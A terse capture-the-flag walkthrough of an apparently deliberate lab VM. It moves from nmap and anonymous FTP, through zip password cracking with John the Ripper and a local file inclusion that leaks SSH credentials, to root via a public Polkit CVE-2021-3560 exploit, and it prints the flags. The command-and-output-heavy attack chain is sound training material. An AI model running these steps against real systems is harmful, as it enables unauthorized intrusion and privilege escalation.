finding ip of the target machine 
```
sudo arp-scan -l
```

nmap scan
```
nmap -sV -O -T4 --min-rate=1000 $ip
```
output:
```zsh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:6A:91:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

port scan:
```
nmap -sC -sV -Pn -p21,22,80 $ip
```
output:
```zsh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.170.71.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)

```
saw anon ftp login allowed

login with anon
```
ftp $ip
```
username: `anonymous`
password: `anonymous`

did something and exit
```ftp
ftp> ls
229 Entering Extended Passive Mode (|||61947|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
226 Directory send OK.
ftp> get respectmydrip.zip
local: respectmydrip.zip remote: respectmydrip.zip
229 Entering Extended Passive Mode (|||31022|)
150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).
100% |***************************************************************************************************************************************************************************************|   471       15.56 KiB/s    00:00 ETA
226 Transfer complete.
471 bytes received in 00:00 (15.39 KiB/s)
ftp> exit
221 Goodbye.

```

unzip the `respectmydrip.zip`
```
unzip respectmydrip.zip
```
output:
```zsh
Archive:  respectmydrip.zip
[respectmydrip.zip] respectmydrip.txt password: 
```
saw its password protected

used jtR to crack the zip pass
```
zip2john respectmydrip.zip > hash.txt && john hash.txt
```
output:
```zsh
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
0g 0:00:00:54  3/3 0g/s 40279Kp/s 40279Kc/s 40279KC/s lm1d3ep..l1lbehn
072528035        (respectmydrip.zip/respectmydrip.txt)     
1g 0:00:01:23 DONE 3/3 (2025-09-04 02:52) 0.01191g/s 41562Kp/s 41562Kc/s 41562KC/s 072238647..072709314
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
got the password of the zip: `072528035`

went to http 
run gobuster
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/big.txt -t 300 -x txt,php,html -q
```
output:
```zsh
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 138]
/robots.txt           (Status: 200) [Size: 78]
/robots.txt           (Status: 200) [Size: 78]
/server-status        (Status: 403) [Size: 277]
```

checked the `robots.txt`
got 2 pages as 
`User-agent: *`
`Disallow: /dripisreal.txt`
`Disallow: /etc/dripispowerful.html`

went to `/dripisreal.txt`
got some information about the password
nothing works :(

went to  `/etc/dripispowerful.html`
`http://10.170.71.84/index.php?drip=/etc/dripispowerful.html`
got an image from there
`password is:
`imdrippinbiatch`

 tried ssh to login on thugger
 ```
 ssh thugger@$ip
 ```
 password: imdrippinbiatch
logged in as user and got the user flag
```
5C50FC503A2ABE93B4C5EE3425496521
```

trying exploits:
dirty pipe: failed
dirty creds: failed
pwn kit: failed
pol kit: success
https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py

download the exploit it in target machine
```
chmod +x polkit.py
python3 polkit.py
```
Access Granted ROOT

```
cd /root
ls
cat root.txt
```

Root Flag 
```
78CE377EF7F10FF0EDCA63DD60EE63B8
```



